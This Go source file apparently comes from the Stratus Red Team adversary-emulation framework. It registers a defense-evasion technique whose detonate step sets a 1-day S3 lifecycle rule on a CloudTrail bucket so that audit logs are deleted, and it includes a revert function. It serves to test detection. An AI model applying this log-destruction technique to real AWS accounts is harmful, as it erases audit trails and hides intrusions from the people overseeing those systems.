package aws

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/s3"
	"github.com/aws/aws-sdk-go-v2/service/s3/types"
	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 "aws.defense-evasion.cloudtrail-lifecycle-rule",
		FriendlyName:       "CloudTrail Logs Impairment Through Lifecycle Rule",
		Platform:           stratus.AWS,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.DefenseEvasion},
		Description: `
Automatically delete CloudTrail logs after 1 day by setting a Lifecycle Rule on the CloudTrail S3 bucket.

References: https://www.justice.gov/usao-sdny/press-release/file/1452706/download

Warm-up: Creates a CloudTrail trail.

Detonation: Applies a 1-day retention S3 Lifecycle Rule.
`,
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string) error {
	s3Client := s3.NewFromConfig(providers.AWS().GetConnection())
	bucketName := params["s3_bucket_name"]

	log.Println("Setting a short retention policy on CloudTrail S3 bucket " + bucketName)
	_, err := s3Client.PutBucketLifecycleConfiguration(context.Background(), &s3.PutBucketLifecycleConfigurationInput{
		Bucket: aws.String(bucketName),
		LifecycleConfiguration: &types.BucketLifecycleConfiguration{
			Rules: []types.LifecycleRule{
				{
					ID:         aws.String("nuke-cloudtrail-logs-after-1-day"),
					Status:     types.ExpirationStatusEnabled,
					Expiration: &types.LifecycleExpiration{Days: 1},
					Filter: &types.LifecycleRuleFilterMemberPrefix{
						Value: "*",
					},
				},
			},
		},
	})

	if err != nil {
		return errors.New("unable to create S3 Lifecycle Policy Rule: " + err.Error())
	}
	return nil
}

func revert(params map[string]string) error {
	s3Client := s3.NewFromConfig(providers.AWS().GetConnection())
	bucketName := params["s3_bucket_name"]

	log.Println("Reverting S3 Lifecycle Rules on CloudTrail S3 bucket " + bucketName)
	_, err := s3Client.DeleteBucketLifecycle(context.Background(), &s3.DeleteBucketLifecycleInput{
		Bucket: aws.String(bucketName),
	})

	if err != nil {
		return errors.New("unable to revert S3 Lifecycle Policy Rule: " + err.Error())
	}
	return nil
}
